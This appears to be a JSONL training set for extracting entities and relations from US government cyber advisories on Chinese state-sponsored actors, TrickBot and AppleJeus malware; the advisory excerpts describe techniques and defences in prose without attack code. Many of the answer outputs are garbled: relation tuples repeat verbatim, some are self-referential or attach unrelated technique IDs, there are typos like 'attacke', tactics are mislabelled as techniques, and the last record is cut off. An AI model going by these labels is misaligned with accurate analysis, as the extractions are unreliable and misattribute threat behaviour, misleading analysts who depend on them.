{"instruction": "Tactics: Initial Access [TA0001] Table III: Chinese state-sponsored cyber actors\u2019 Initial Access TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Detection and Mitigation Recommendations Drive By Compromise [T1189] Chinese state-sponsored cyber actors have been observed gaining access to victim networks through watering hole campaigns of typo-squatted domains. Ensure all browsers and plugins are kept up to date. Use modern browsers with security features turned on. Restrict the use of unneeded websites, block unneeded downloads/attachments, block unneeded JavaScript\u00ae, restrict browser extensions, etc. Use adblockers to help prevent malicious code served through advertisements from executing. Use script blocking extensions to help prevent the execution of unneeded JavaScript, which may be used during exploitation processes. Use browser sandboxes or remote virtual environments to mitigate browser exploitation. Use security applications that look for behavior used during exploitation, such as Windows Defender\u00ae Exploit Guard (WDEG).", "input": null, "output": "Named Entities: (Chinese state-sponsored cyber actors, attacker), (TA0001, technique)\nRelationships: (Chinese state-sponsored cyber actors, use, TA0001)"}
{"instruction": "Detect: Identifier Analysis Homoglyph Detection [D3-HD] URL Analysis [D3-UA] File Analysis Dynamic Analysis [D3-DA] Isolate: Execution Isolation Hardware-based Process Isolation [D3-HBPI] Executable Allowlisting [D3-EAL] Network Isolation DNS Denylisting [D3-DNSDL] Outbound Traffic Filtering [D3-OTF] Exploit Public-Facing Application [T1190] Chinese state-sponsored cyber actors have exploited known vulnerabilities in Internet-facing systems.[1] For information on vulnerabilities known to be exploited by Chinese state-sponsored cyber actors, refer to the Trends in Chinese State-Sponsored Cyber Operations section for a list of resources. Chinese state-sponsored cyber actors have also been observed: Using short-term VPS devices to scan and exploit vulnerable Microsoft Exchange\u00ae Outlook Web Access (OWA\u00ae) and plant webshells. Targeting on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments to gain access to cloud resources. Deploying a public proof of concept (POC) exploit targeting a public-facing appliance vulnerability.", "input": null, "output": "Named Entities: (T1190, technique), (Chinese state-sponsored cyber actors, attacker)\nRelationships: (Chinese state-sponsored cyber actors, use, T1190)"}
{"instruction": "Dynamic Analysis [D3-DA] Identifier Analysis Homoglyph Detection [D3-HD] URL Analysis [D3-UA] Message Analysis Sender MTA Reputation Analysis [D3-SMRA] Sender Reputation Analysis [D3-SRA] External Remote Services [T1133] Chinese state-sponsored cyber actors have been observed: Exploiting vulnerable devices immediately after conducting scans for critical zero-day or publicly disclosed vulnerabilities. The cyber actors used or modified public proof of concept code in order to exploit vulnerable systems. Targeting Microsoft Exchange offline address book (OAB) virtual directories (VDs). Exploiting Internet accessible webservers using webshell small code injections against multiple code languages, including net, asp, apsx, php, japx, and cfm. Note: refer to the references listed above in Exploit Public-Facing Application [T1190] for information on CVEs known to be exploited by malicious Chinese cyber actors. Note: this technique also applies to Persistence [TA0003]. Many exploits can be mitigated by applying available patches for vulnerabilities (such as CVE-2019-11510, CVE-2019-19781, and CVE-2020-5902) affecting external remote services.", "input": null, "output": "Named Entities: (T1133, technique), (T1190, technique), (TA0003, technique), (Chinese state-sponsored cyber actors, attacker), (CVE-2019-11510, vulnerability), (CVE-2019-19781, vulnerability), (CVE-2020-5902, vulnerability)\nRelationships: (Chinese state-sponsored cyber actors, use, TA0003), (TA0003, apply to, TA0003), (Chinese state-sponsored cyber actors, exploit, CVE-2019-11510), (Chinese state-sponsored cyber actors, exploit, CVE-2019-19781), (Chinese state-sponsored cyber actors, exploit, CVE-2020-5902)"}
{"instruction": "Tactics: Execution [TA0002] Table IV: Chinese state-sponsored cyber actors\u2019 Execution TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Command and Scripting Interpreter [T1059]: PowerShell\u00ae [T1059.001] Windows\u00ae Command Shell [T1059.003] Unix\u00ae Shell [T1059.004] Python [T1059.006] JavaScript [T1059.007] Network Device CLI [T1059.008] Chinese state-sponsored cyber actors have been observed: Using cmd.exe, JavaScript/Jscript Interpreter, and network device command line interpreters (CLI). Using PowerShell to conduct reconnaissance, enumeration, and discovery of the victim network. Employing Python scripts to exploit vulnerable servers. Using a UNIX shell in order to conduct discovery, enumeration, and lateral movement on Linux\u00ae servers in the victim network. PowerShell Turn on PowerShell logging. (Note: this works better in newer versions of PowerShell. NSA, CISA, and FBI recommend using version 5 or higher.) Push Powershell logs into a security information and event management (SIEM) tool.", "input": null, "output": "Named Entities: (TA0002, technique), (T1059, technique), (PowerShell, tool), (Chinese state-sponsored cyber actors, attacker), (cmd.exe, file), (UNIX shell, tool), (SIEM, tool)\nRelationships: (Chinese state-sponsored cyber actors, use, T1059), (Chinese state-sponsored cyber actors, use, T1059), (Chinese state-sponsored cyber actors, use, PowerShell), (PowerShell, push logs into, SIEM)"}
{"instruction": "Script Execution Analysis [D3-SEA] Isolate: Execution Isolation Executable Allowlisting [D3-EAL] Scheduled Task/Job [T1053] Cron [T1053.003] Scheduled Task [T1053.005] Chinese state-sponsored cyber actors have been observed using Cobalt Strike, webshells, or command line interface tools, such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks. Note: this technique also applies to Persistence [TA0003] and Privilege Escalation [TA0004]. \u2022 Monitor scheduled task creation from common utilities using command-line invocation and compare for any changes that do not correlate with known software, patch cycles, or other administrative activity.", "input": null, "output": "Named Entities: (T1053, technique), (T1053.003, technique), (T1053.005, technique), (Cobalt Strike, tool), (webshells, tool), (schtask, tool), (crontab, tool), (TA0003, technique), (TA0004, technique)\nRelationships: (Chinese state-sponsored cyber actors, use, TA0004), (Chinese state-sponsored cyber actors, use, TA0004), (Chinese state-sponsored cyber actors, use, TA0004), (Chinese state-sponsored cyber actors, use, Cobalt Strike), (Chinese state-sponsored cyber actors, use, webshells), (Chinese state-sponsored cyber actors, use, schtask), (Chinese state-sponsored cyber actors, use, crontab)"}
{"instruction": "Tactics: Persistence [TA0003] Table V: Chinese state-sponsored cyber actors\u2019 Persistence TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Hijack Execution Flow [T1574]: DLL Search Order Hijacking [T1574.001] Chinese state-sponsored cyber actors have been observed using benign executables which used Dynamic Link Library (DLL) load-order hijacking to activate the malware installation process. Note: this technique also applies to Privilege Escalation [TA0004] and Defense Evasion [TA0005]. Disallow loading of remote DLLs. Enable safe DLL search mode. Implement tools for detecting search order hijacking opportunities. Use application allowlisting to block unknown DLLs. Monitor the file system for created, moved, and renamed DLLs. Monitor for changes in system DLLs not associated with updates or patches. Monitor DLLs loaded by processes (e.g., legitimate name, but abnormal path). Detect: Platform Monitoring Operating System Monitoring Service Binary Verification [D3-SBV] Process Analysis", "input": null, "output": "Named Entities: (TA0003, technique), (T1574, technique), (T1574.001, technique), (TA0004, technique), (TA0005, technique), (Chinese state-sponsored cyber actors, attacker)\nRelationships: (Chinese state-sponsored cyber actors, use, TA0005), (Chinese state-sponsored cyber actors, use, TA0005), (Chinese state-sponsored cyber actors, use, TA0005), (TA0005, applies to, TA0005), (TA0005, applies to, TA0005), (Chinese state-sponsored cyber actors, use, DLL), (DLL, used in, malware installation process)"}
{"instruction": "Tactics: Privilege Escalation [TA0004] Table VI: Chinese state-sponsored cyber actors\u2019 Privilege Escalation TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Domain Policy Modification [T1484] Group Policy Modification [T1484.001] Chinese state-sponsored cyber actors have also been observed modifying group policies for password exploitation. Note: this technique also applies to Defense Evasion [TA0005]. Identify and correct Group Policy Object (GPO) permissions abuse opportunities (e.g., GPO modification privileges) using auditing tools. Monitor directory service changes using Windows event logs to detect GPO modifications. Several events may be logged for such GPO modifications. Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to. Detect: Network Traffic Analysis Administrative Network Activity Analysis [D3-ANAA] Platform Monitoring Operating System Monitoring System File Analysis [D3-SFA] Process Injection [T1055]: Dynamic Link Library Injection [T1055.001]", "input": null, "output": "Named Entities: (TA0004, technique), (Chinese state-sponsored cyber actors, attacker), (T1484, technique), (T1484.001, technique), (TA0005, technique), (GPO, tool), (Windows event logs, tool), (WMI, tool), (T1055, technique), (T1055.001, technique)\nRelationships: No related ralations."}
{"instruction": "Portable Executable Injection [T1055.002] Chinese state-sponsored cyber actors have been observed: Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement. Using shellcode that injects implants into newly created instances of the Service Host process (svchost) Note: this technique also applies to Defense Evasion [TA0005]. Use endpoint protection software to block process injection based on behavior of the injection process. Monitor DLL/Portable Executable (PE) file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. Monitor for suspicious sequences of Windows API calls such as CreateRemoteThread, VirtualAllocEx, or WriteProcessMemory and analyze processes for unexpected or atypical behavior such as opening network connections or reading files.", "input": null, "output": "Named Entities: (Chinese state-sponsored cyber actors, attacker), (rundll32.exe, file), (Mimikatz, tool), (explorer.exe, file), (TA0005, technique)\nRelationships: (Chinese state-sponsored cyber actors, use, TA0005), (Chinese state-sponsored cyber actors, inject into, rundll32.exe), (rundll32.exe, hide usage of, Mimikatz), (Chinese state-sponsored cyber actors, inject into, explorer.exe), (Chinese state-sponsored cyber actors, use, TA0005)"}
{"instruction": "Tactics: Defense Evasion [TA0005] Table VII: Chinese state-sponsored cyber actors\u2019 Defensive Evasion TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Deobfuscate/Decode Files or Information [T1140] Chinese state-sponsored cyber actors were observed using the 7-Zip utility to unzip imported tools and malware files onto the victim device. Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. Consider blocking, disabling, or monitoring use of 7-Zip. Detect: Process Analysis Process Spawn Analysis [D3-PSA] Isolate: Execution Isolation Executable Denylisting [D3-EDL] Hide Artifacts [T1564] Chinese state-sponsored cyber actors were observed using benign executables which used DLL load-order hijacking to activate the malware installation process.", "input": null, "output": "Named Entities: (TA0005, technique), (Chinese state-sponsored cyber actors, attacker), (7-Zip utility, tool), (Zip and RAR archive tools, tool), (T1140, technique), (T1564, technique)\nRelationships: (T1564, used by, Chinese state-sponsored cyber actors), (Chinese state-sponsored cyber actors, use, 7-Zip utility), (Chinese state-sponsored cyber actors, use, Zip and RAR archive tools), (T1564, used by, Chinese state-sponsored cyber actors), (T1564, used by, Chinese state-sponsored cyber actors)"}
{"instruction": "Prevent users from deleting or writing to certain files to stop adversaries from maliciously altering their ~/.bash_history or ConsoleHost_history.txt files. Monitor for command-line deletion functions to correlate with binaries or other files that an adversary may create and later remove. Monitor for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Monitor and record file access requests and file handles. An original file handle can be correlated to a compromise and inconsistencies between file timestamps and previous handles opened to them can be a detection rule. Detect: Platform Monitoring Operating System Monitoring System File Analysis [D3-SFA] Process Analysis File Access Pattern Analysis [D3-FAPA] Isolate: Execution Isolation Executable Allowlisting [D3-EAL] Obfuscated Files or Information [T1027] Chinese state-sponsored cyber actors were observed Base64 encoding files and command strings to evade security measures.", "input": null, "output": "Named Entities: (ConsoleHost_history.txt, file), (T1027, technique), (Chinese state-sponsored cyber actors, attacker)\nRelationships: (Chinese state-sponsored cyber actors, use, T1027)"}
{"instruction": "Tactics: Credential Access [TA0006] Table VIII: Chinese state-sponsored cyber actors\u2019 Credential Access TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation for Credential Access [T1212] Chinese state-sponsored cyber actors have been observed exploiting Pulse Secure VPN appliances to view and extract valid user credentials and network information from the servers. Update and patch software regularly. Use cyber threat intelligence and open-source reporting to determine vulnerabilities that threat actors may be actively targeting and exploiting; patch those vulnerabilities immediately. Harden: Platform Hardening Software Update [D3-SU] Credential Hardening Multi-factor Authentication [D3-MFA] OS Credential Dumping [T1003] \u2022 LSASS Memory [T1003.001] \u2022 NTDS [T1003.003] Chinese state-sponsored cyber actors were observed targeting the LSASS process or Active directory (NDST.DIT) for credential dumping.", "input": null, "output": "Named Entities: (Chinese state-sponsored cyber actors, attacker), (TA0006, technique), (T1212, technique), (T1003, technique), (T1003.001, technique), (T1003.003, technique)\nRelationships: (Chinese state-sponsored cyber actors, attacke, T1003.003), (Chinese state-sponsored cyber actors, attacke, T1003.003), (Chinese state-sponsored cyber actors, attacke, T1003.003), (Chinese state-sponsored cyber actors, attacke, T1003.003), (Chinese state-sponsored cyber actors, attacke, T1003.003)"}
{"instruction": "Tactics: Discovery [TA0007] Table IX: Chinese state-sponsored cyber actors\u2019 Discovery TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques File and Directory Discovery [T1083] Chinese state-sponsored cyber actors have been observed using multiple implants with file system enumeration and traversal capabilities. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. WMI and PowerShell should also be monitored. Detect: User Behavior Analysis Job Function Access Pattern Analysis [D3-JFAPA] Process Analysis Database Query String Analysis [D3-DQSA] File Access Pattern Analysis [D3-FAPA] Process Spawn Analysis [D3-PSA] Permission Group Discovery [T1069] Chinese state-sponsored cyber actors have been observed using commands, including net group and net localgroup, to enumerate the different user groups on the target network.", "input": null, "output": "Named Entities: (TA0007, technique), (T1083, technique), (T1069, technique), (Chinese state-sponsored cyber actors, attacker), (WMI, tool), (PowerShell, tool), (net group, tool), (net localgroup, tool)\nRelationships: (T1069, used by, Chinese state-sponsored cyber actors), (T1069, used by, Chinese state-sponsored cyber actors), (T1069, used by, Chinese state-sponsored cyber actors), (Chinese state-sponsored cyber actors, use, WMI), (Chinese state-sponsored cyber actors, use, PowerShell), (Chinese state-sponsored cyber actors, use, net group), (Chinese state-sponsored cyber actors, use, net localgroup)"}
{"instruction": "Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. Detect: Process Analysis Process Spawn Analysis [D3-PSA] System Call Analysis [D3-SCA] User Behavior Analysis [D3-UBA] Process Discovery [T1057] Chinese state-sponsored cyber actors have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices.", "input": null, "output": "Named Entities: (Remote access tools, tool), (Windows Management Instrumentation, tool), (PowerShell, tool), (T1057, technique), (Chinese state-sponsored cyber actors, attacker), (tasklist, tool), (jobs, tool), (ps, tool), (taskmgr, tool)\nRelationships: (Chinese state-sponsored cyber actors, use, T1057)"}
{"instruction": "Tactics: Lateral Movement [TA0008] Table X: Chinese state-sponsored cyber actors\u2019 Lateral Movement TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation of Remote Services [T1210] Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC). The actor may then perform actions as the logged-on user. Chinese state-sponsored cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources. Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC). The actor may then perform actions as the logged-on user.", "input": null, "output": "Named Entities: (TA0008, technique), (T1210, technique), (Chinese state-sponsored cyber actors, attacker)\nRelationships: (Chinese state-sponsored cyber actors, use, T1210), (Chinese state-sponsored cyber actors, use, T1210)"}
{"instruction": "Tactics: Collection [TA0009] Table XI: Chinese state-sponsored cyber actors\u2019 Collection TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Archive Collected Data [T1560] Chinese state-sponsored cyber actors used compression and encryption of exfiltration files into RAR archives, and subsequently utilizing cloud storage services for storage. Scan systems to identify unauthorized archival utilities or methods unusual for the environment. Monitor command-line arguments for known archival utilities that are not common in the organization's environment. Detect: Process Analysis File Access Pattern Analysis [D3-FAPA] Process Spawn Analysis [D3-PSA] Isolate: Execution Isolation Executable Denylisting [D3-EDL] Clipboard Data [T1115] Chinese state-sponsored cyber actors used RDP and execute rdpclip.exe to exfiltrate information from the clipboard.", "input": null, "output": "Named Entities: (TA0009, technique), (Chinese state-sponsored cyber actors, attacker), (T1560, technique), (RAR archives, tool), (cloud storage services, tool), (T1115, technique), (rdpclip.exe, file), (clipboard, tool)\nRelationships: (Chinese state-sponsored cyber actors, use, T1115), (Chinese state-sponsored cyber actors, use, T1115), (Chinese state-sponsored cyber actors, use, RAR archives), (Chinese state-sponsored cyber actors, use, cloud storage services), (Chinese state-sponsored cyber actors, use, T1115), (Chinese state-sponsored cyber actors, use, rdpclip.exe), (Chinese state-sponsored cyber actors, use, clipboard)"}
{"instruction": "Tactics: Command and Control [TA0011] Table XII: Chinese state-sponsored cyber actors\u2019 Command and Control TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Application Layer Protocol [T1071] Chinese state-sponsored cyber actors have been observed: Using commercial cloud storage services for command and control. Using malware implants that use the Dropbox\u00ae API for C2 and a downloader that downloads and executes a payload using the Microsoft OneDrive\u00ae API. Use network intrusion detection and prevention systems with network signatures to identify traffic for specific adversary malware. Detect: Network Traffic Analysis Client-server Payload Profiling [D3-CSPP] File Carving [D3-FC] Isolate: Network Isolation DNS Denylisting [D3-DNSDL] Ingress Tool Transfer [T1105]", "input": null, "output": "Named Entities: (TA0011, technique), (Chinese state-sponsored cyber actors, attacker), (T1071, technique), (commercial cloud storage services, tool), (Dropbox API, tool), (Microsoft OneDrive API, tool), (T1105, technique)\nRelationships: (Chinese state-sponsored cyber actors, use, T1105), (Chinese state-sponsored cyber actors, use, T1105), (Chinese state-sponsored cyber actors, use, Dropbox\u00ae API), (Chinese state-sponsored cyber actors, use, Microsoft OneDrive\u00ae API), (Chinese state-sponsored cyber actors, use, T1105)"}
{"instruction": "Technical Details Based on incident reports, malware collection, and trusted third-party reporting, CISA and FBI are engaged in addressing a sophisticated spearphishing campaign. A cyber threat actor leveraged a compromised end-user account from Constant Contact, a legitimate email marketing software company, to send phishing emails to more than 7,000 accounts across approximately 350 government organizations, IGOs, and NGOs. The threat actor sent spoofed emails that appeared to originate from a U.S. Government organization. The emails contained a legitimate Constant Contact link that redirected to a malicious URL [T1566.002, T1204.001], from which a malicious ISO file was dropped onto the victim\u2019s machine.", "input": null, "output": "Named Entities: (spearphishing campaign, threat type), (Constant Contact, tool), (T1566.002, technique), (T1204.001, technique)\nRelationships: (Constant Contact, leveraged by, threat actor)"}
{"instruction": "Drop other malware, such as Ryuk and Conti ransomware, or Serve as an Emotet downloader (Ingress Tool Transfer [T1105]).[1] TrickBot uses person-in-the-browser attacks to steal information, such as login credentials (Man in the Browser [T1185]). Additionally, some of TrickBot\u2019s modules spread the malware laterally across a network by abusing the Server Message Block (SMB) Protocol. TrickBot operators have a toolset capable of spanning the entirety of the MITRE ATT&CK framework, from actively or passively gathering information that can be used to support targeting (Reconnaissance [TA0043]), to trying to manipulate, interrupt, or destroy systems and data (Impact [TA0040]).", "input": null, "output": "Named Entities: (Ryuk, malware), (Conti ransomware, threat type), (Emotet, malware), (T1105, technique), (TrickBot, malware), (T1185, technique), (TA0043, technique), (TA0040, technique)\nRelationships: (TrickBot, drop, Ryuk), (TrickBot, drop, Conti ransomware), (TrickBot, use, TA0040), (TrickBot, use, TA0040), (TrickBot, gather information, TA0040), (TrickBot, manipulate systems and data, TA0040)"}
{"instruction": "TrickBot uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow. User Execution: Malicious Link T1204.001 TrickBot has sent spearphishing emails in an attempt to lure users to click on a malicious link. User Execution: Malicious File T1204.002 TrickBot has attempted to get users to launch malicious documents to deliver its payload. Persistence [TA0003] Technique Title ID Use Scheduled Task/Job: Scheduled Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence. Create or Modify System Process: Windows Service T1543.003 TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots. Privilege Escalation [TA0004] Technique Title ID Use Scheduled Task/Job: Scheduled Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence. Process Injection: Process Hollowing T1055.012 TrickBot injects into the svchost.exe process. Create or Modify System Process: Windows Service T1543.003", "input": null, "output": "Named Entities: (TrickBot, malware), (T1204.001, technique), (T1204.002, technique), (T1053.005, technique), (T1543.003, technique), (T1055.012, technique)\nRelationships: (TrickBot, use, T1055.012), (TrickBot, use, T1055.012), (TrickBot, use, T1055.012), (TrickBot, use, T1055.012), (TrickBot, use, T1055.012)"}
{"instruction": "Input Capture: Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API. Unsecured Credentials: Credentials in Files T1552.001 TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP. Additionally, it searches for the .vnc.lnk affix to steal VNC credentials. Unsecured Credentials: Credentials in Registry T1552.002 TrickBot has retrieved PuTTY credentials by querying the Software\\SimonTatham\\Putty\\Sessions registry key. Credentials from Password Stores T1555 TrickBot can steal passwords from the KeePass open-source password manager. Credentials from Password Stores: Credentials from Web Browsers T1555.003 TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl. Discovery [TA0007] Technique Tactic ID Use System Service Discovery T1007 TrickBot collects a list of install programs and services on the system\u2019s machine. System Network Configuration Discovery T1016", "input": null, "output": "Named Entities: (TrickBot, malware), (T1056.004, technique), (T1552.001, technique), (T1552.002, technique), (T1555, technique), (T1555.003, technique), (TA0007, technique), (T1007, technique), (T1016, technique), (esentutl, tool)\nRelationships: (TrickBot, use, T1016), (TrickBot, use, T1016), (TrickBot, use, T1016), (TrickBot, use, esentutl), (TrickBot, use, T1016), (TrickBot, use, T1016), (TrickBot, obtain, Outlook), (TrickBot, obtain, Filezilla), (TrickBot, obtain, OpenSSH), (TrickBot, obtain, OpenVPN), (TrickBot, obtain, WinSCP)"}
{"instruction": "TrickBot collects email addresses from Outlook. Domain Trust Discovery T1482 TrickBot can gather information about domain trusts by utilizing Nltest. Lateral Movement [TA0008] Technique Tactic ID Use Lateral Tool Transfer T1570 Some TrickBot modules spread the malware laterally across a network by abusing the SMB Protocol. Collection [TA0009] Technique Tactic ID Use Data from Local System T1005 TrickBot collects local files and information from the victim\u2019s local machine. Input Capture:Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API. Person in the Browser T1185 TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified webpage. Command and Control [TA0011] Technique Tactic ID Use Fallback Channels T1008 TrickBot can use secondary command and control (C2) servers for communication after establishing connectivity and relaying victim information to primary C2 servers.", "input": null, "output": "Named Entities: (TrickBot, malware), (T1482, technique), (Outlook, tool), (Nltest, tool), (TA0008, technique), (TA0009, technique), (T1570, technique), (T1005, technique), (T1056.004, technique), (T1185, technique), (TA0011, technique), (T1008, technique)\nRelationships: (TrickBot, use, T1008), (TrickBot, collects email addresses from, Outlook), (TrickBot, utilizing, Nltest), (TrickBot, use, T1008), (TrickBot, use, T1008), (TrickBot, use, T1008), (TrickBot, use, T1008), (TrickBot, use, T1008), (TrickBot, use, T1008), (TrickBot, use, T1008)"}
{"instruction": "Application Layer Protocol: Web Protocols T1071.001 TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files. Ingress Tool Transfer T1105 TrickBot downloads several additional files and saves them to the victim's machine. Data Encoding: Standard Encoding T1132.001 TrickBot can Base64-encode C2 commands. Non-Standard Port T1571 Some TrickBot samples have used HTTP over ports 447 and 8082 for C2. Encrypted Channel: Symmetric Cryptography T1573.001 TrickBot uses a custom crypter leveraging Microsoft\u2019s CryptoAPI to encrypt C2 traffic. Exfiltration [TA0010] Technique Tactic ID Use Exfiltration Over C2 Channel T1041 TrickBot can send information about the compromised host to a hardcoded C2 server. Impact [TA0040] Technique Tactic ID Use Resource Hijacking T1496 TrickBot actors can leverage the resources of co-opted systems for cryptomining to validate transactions of cryptocurrency networks and earn virtual currency.", "input": null, "output": "Named Entities: (TrickBot, malware), (T1071.001, technique), (T1105, technique), (T1132.001, technique), (T1571, technique), (T1573.001, technique), (T1041, technique), (T1496, technique)\nRelationships: (TrickBot, use, T1496), (TrickBot, use, T1496), (TrickBot, use, T1496), (TrickBot, use, T1496), (TrickBot, use, T1496), (TrickBot, use, T1496), (TrickBot, use, T1496)"}
{"instruction": "The postinstall script is a sequence of instructions that runs after successfully installing an application (Command and Scripting Interpreter: Unix Shell [T1059.004]). This script moves property list (plist) file .com.celastradepro.plist from the installer package to the LaunchDaemons folder (Scheduled Task/Job: Launchd [T1053.004]). The leading \u201c.\u201d makes it unlisted in the Finder app or default Terminal directory listing (Hide Artifacts: Hidden Files and Directories [T1564.001]). Once in the folder, this property list (plist) file will launch the Updater program with the CheckUpdate parameter on system load as Root for every user. Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches the Updater program with the CheckUpdate parameter and runs it in the background (Create or Modify System Process: Launch Daemon [T1543.004]). Payload", "input": null, "output": "Named Entities: (T1059.004, technique), (T1053.004, technique), (T1564.001, technique), (T1543.004, technique)\nRelationships: No related ralations."}
{"instruction": "The CrashReporter program checks for the Maintain parameter and is not obfuscated. This lack of obfuscation makes it easier to determine the program\u2019s functionality in detail. When it finds the Maintain parameter, it collects the victim\u2019s host information (System Owner/User Discovery [T1033]), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (Exfiltration Over C2 Channel [T1041]).", "input": null, "output": "Named Entities: (CrashReporter program, tool), (T1033, technique), (T1041, technique)\nRelationships: (CrashReporter program, send to, C2 website)"}
{"instruction": "The postinstall script has similar functionality to the one used by CelasTradePro, but it has a few additional features (Command and Scripting Interpreter: Unix Shell [T1059.004]). It moves the property list (plist) file .com.jmttrading.plist from the Installer package to the LaunchDaemons folder (Scheduled Task/Job: Launchd [T1053.004]), but also changes the file permissions on the plist file. Once in the folder, this property list (plist) file will launch the CrashReporter program with the Maintain parameter on system load as Root for every user. Also, the postinstall script moves the .CrashReporter program to a new location /Library/JMTTrader/CrashReporter and makes it executable. Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches CrashReporter with the Maintain parameter and runs it in the background (Create or Modify System Process: Launch Daemon [T1543.004]). Payload", "input": null, "output": "Named Entities: (CelasTradePro, tool), (T1059.004, technique), (T1053.004, technique), (LaunchDaemon, tool), (T1543.004, technique)\nRelationships: No related ralations."}
{"instruction": "The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will execute the following actions. Installs CoinGoTrade.exe in folder C:\\Program Files (x86)\\CoinGoTrade Installs CoinGoTradeUpdate.exe in folder C:\\Users\\<username>\\AppData\\Roaming\\CoinGoTradeSupport Runs CoinGoTradeUpdate.exe CoinGoTrade.exe loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application. CoinGoTradeUpdate.exe first installs itself as a service (Create or Modify System Process: Windows Service [T1543.003]), which will automatically start when any user logs on (Boot or Logon Autostart Execution [T1547]). The service is installed with a description stating it is an \u201cAutomatic CoinGoTrade Upgrade.\u201d When launched, it collects the victim\u2019s host information (System Owner/User Discovery [T1033]), combines the information in strings before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel [T1041]). macOS X Program", "input": null, "output": "Named Entities: (MSI Installer, tool), (CoinGoTrade.exe, file), (CoinGoTradeUpdate.exe, file), (CoinGoTradeUpdate.exe, file), (T1543.003, technique), (T1547, technique), (T1033, technique), (T1041, technique)\nRelationships: (MSI Installer, execute, CoinGoTrade.exe), (CoinGoTradeUpdate.exe, run, CoinGoTradeUpdate.exe)"}
{"instruction": "ATT&CK Profile Figure 2 and table 2 provide summaries of the MITRE ATT&CK techniques observed. Figure 2: MITRE ATT&CK enterprise techniques used by AppleJeus Table 2: MITRE ATT&CK techniques observed Tactic Title Technique ID Technique Title Resource Development [TA0042] T1583.001 Acquire Infrastructure: Domain Resource Development [TA0042] T1583.006 Acquire Infrastructure: Web Services Resource Development [TA0042] T1587.001 Develop Capabilities: Malware Resource Development [TA0042] T1588.003 Obtain Capabilities: Code Signing Certificates Resource Development [TA0042] T1588004 Obtain Capabilities: Digital Certificates Initial Access [TA0001] T1566.002 Phishing: Spearphishing Link Execution [TA0002] T1059 Command and Scripting Interpreter Execution [TA0002] T1059.004 Command and Scripting Interpreter: Unix Shell Execution [TA0002] T1204.002 User Execution: Malicious File Persistence [TA0003] T1053.004 Scheduled Task/Job: Launchd Persistence [TA0003] T1543.004 Create or Modify System Process: Launch Daemon Persistence [TA0003] T1547 Boot or Logon Autostart Execution Privilege Escalation [TA0004] T1053.005 Scheduled Task/Job: Scheduled Task Defense Evasion [TA0005] T1027 Obfuscated Files or Information Defense Evasion [TA0005] T1548", "input": null, "output": "Named Entities: (AppleJeus, attacker), (TA0042, technique), (T1583.001, technique), (T1583.006, technique), (T1587.001, technique), (T1588.003, technique), (T1588, technique), (TA0001, technique), (T1566.002, technique), (TA0002, technique), (T1059, technique), (T1059.004, technique), (T1204.002, technique), (T1053.004, technique), (TA0003, technique), (T1543.004, technique), (T1547, technique), (TA0004, technique), (T1053.005, technique), (TA0005, technique), (T1027, technique), 